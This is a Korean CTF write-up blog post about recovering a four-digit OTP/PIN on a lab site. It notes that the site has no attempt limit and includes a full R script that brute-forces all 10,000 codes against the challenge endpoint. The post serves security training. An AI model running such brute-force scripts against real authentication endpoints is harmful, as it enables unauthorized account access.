---
layout: single
title:  "5주차 SQL injection 인증우회 문제풀이(4)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false

---

<br>

# <span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(4)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1  4번 문제</span>

<br>



<img src="/images/2024-05-29-SQLinjection8/1.PNG" alt="1" style="zoom:80%;" />

<img src="/images/2024-05-29-SQLinjection8/2.PNG" alt="2" style="zoom:67%;" />

<br>

<span style='font-weight:bold; font-size:25px'>▶ 목표 : PIN Code 알아내기!!! </span>

<br>

### <span style="background:#A9A9A9; color:#ffffff">1.1.1 주어진 정보 확인하기</span>

***

<br>

<img src="/images/2024-05-29-SQLinjection8/3.PNG" alt="3" style="zoom:67%;" />

<img src="/images/2024-05-29-SQLinjection8/4.PNG" alt="4" style="zoom:60%;" />

비밀번호를 입력한 파일 요청한 응답을 보면 번호가 바뀐 url로 리다이렉션 하므로 번호를 알아야만 접속할 수 있습니다.  
하지만 틀려도 횟수 제한이 걸려 있지 않기 때문에 여러  번 시도 할 수 있는 것을 이용하여 intruder를 사용하면 될 듯 합니다.  
(Brute Force Attack)

<br>

<img src="/images/2024-05-29-SQLinjection8/5.PNG" alt="5" style="zoom:70%;" />

<img src="/images/2024-05-29-SQLinjection8/6.PNG" alt="6" style="zoom:50%;" />

<img src="/images/2024-05-29-SQLinjection8/7.PNG" alt="7" style="zoom: 67%;" />

그렇지만 확장 기능이 없으므로 특정 변화가 생기면 멈추지 않습니다. 일일이 수동으로 변화를 감지할 수도 없는 노릇이니  
다른 프로그램 언어로 서버로 요청하는 것이 좋을 것 같습니다.

### <br><span style="background:#A9A9A9; color:#ffffff">1.1.2  R 프로그램을 이용하여 서버로 요청하기<span style='font-size:80%'>(Brute Force Attack)</span></span>

***

<br>

해당 방법을 이용하면 응답이 다를 때 중단되도록 만들었습니다.

```R
library(httr)

# OTP 검증 함수 정의
check_otp <- function(otp) {
  base_url <- "http://ctf.segfaulthub.com:1129/6/checkOTP.php"
  query_string <- sprintf("?otpNum=%s", otp)
  full_url <- paste0(base_url, query_string)
  
  # 서버로부터 응답 받기
  response <- GET(full_url)
  
  # 응답 내용에서 HTML을 추출
  response_content <- content(response, "text", encoding = "UTF-8")
  
  # 응답 내용의 첫 100자 출력
  cat("Testing OTP: ", otp, "\nResponse Content: ", substr(response_content, 1, 100), "\n")
  
  # 응답 내용 반환
  return(response_content)
}

# 초기 응답 저장
initial_response <- check_otp("0000")

# 모든 OTP 검증
for (i in 1:9999) {
  otp <- sprintf("%04d", i)
  current_response <- check_otp(otp)
  
  # 현재 응답과 초기 응답 비교
  if (current_response != initial_response) {
    cat("Response changed at OTP: ", otp, "\n")
    break  # 응답이 변경되었을 때 루프 중단
  }
}
```



<img src="/images/2024-05-29-SQLinjection8/8.PNG" alt="8" style="zoom:50%;" />

<img src="/images/2024-05-29-SQLinjection8/9.PNG" alt="9" style="zoom:50%;" />
